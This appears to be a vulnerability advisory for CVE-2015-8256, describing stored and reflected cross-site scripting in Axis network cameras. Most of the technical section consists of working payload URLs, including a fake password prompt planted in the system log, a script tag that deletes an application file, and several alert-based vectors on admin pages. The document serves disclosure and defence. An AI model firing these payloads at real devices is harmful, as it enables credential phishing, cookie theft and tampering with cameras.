Title: Axis Network Cameras Multiple Cross-site scripting
Vendor: Axis Communications
Class: Improper Input Validation [CWE-20]
CVE Name: CVE-2015-8256
Remotely Exploitable: Yes
Locally Exploitable: No
OLSA-ID: OLSA-2015-8256


vulnerability
-------------
AXIS Network Cameras are prone to multiple (stored/reflected) cross-site
scripting vulnerability.

technical details
-----------------
** STORED XSS


# 1 Attacker injects a javascript payload in the vulnerable page (using
some social enginner aproach):

http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script
type="text/javascript>prompt("AXIS_PASSWORD:")</script>

This will generate an error like this on page:

"
Error processing XML: Incorrect formatting
line number 2, column 60:
<error type = "No_such_application" message = "No application" &#039;<script
type="text/javascript>prompt("AXIS_PASSWORD:")</script>&#039;
----------------------------------------------------------------^
"

and also will create a entry in the genneral log file (/var/log/messages)
with the JSPayload:

"
<INFO    > Apr 11 10:08:45 axis-eac8c03d901 vaconfig.cgi: Could not find
application &#039;<script
type="text/javascript>prompt("AXIS_PASSWORD:")</script>&#039;
"

When the user is viewing the log &#039;system options&#039; -> &#039;support&#039; -> &#039;Logs &
Reports&#039;:
http://{axishost}/axis-cgi/admin/systemlog.cgi?id

method will be executed showing a prompt asking user for the password
(&#039;AXIS_PASSWORD&#039;).

* With this vector an attacker is able to perfome many attacks using
javascript, for example to hook users browser, capture users cookie,
performe pishing attacks etc.

example, to delete an application "axis_update" via SXSS:

http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script src="http://
axishost/axis-cgi/admin/local_del.cgi?+/usr/html/local/viewer/axis_update.shtml"></script>


A reflected cross-site scripting affects all models of AXIS devices on the
same parameter:
http://
{axis-cam-model}/view/view.shtml?imagePath=0WLL</script><script>alert(&#039;AXIS-XSS&#039;)</script><!--

# Other Vectors
http://
{axishost}/admin/config.shtml?group=%3Cscript%3Ealert%281%29%3C/script%3E

http://{axishost}/view/custom_whiteBalance.shtml?imagePath=<img src="xs"
onerror=alert(7) /><!--
http://{axishost}/admin-bin/editcgi.cgi?file=<script>alert(1)</script>

http://
{axishost}/operator/recipient_test.shtml?protocol=%3Cscript%3Ealert%281%29%3C/script%3E
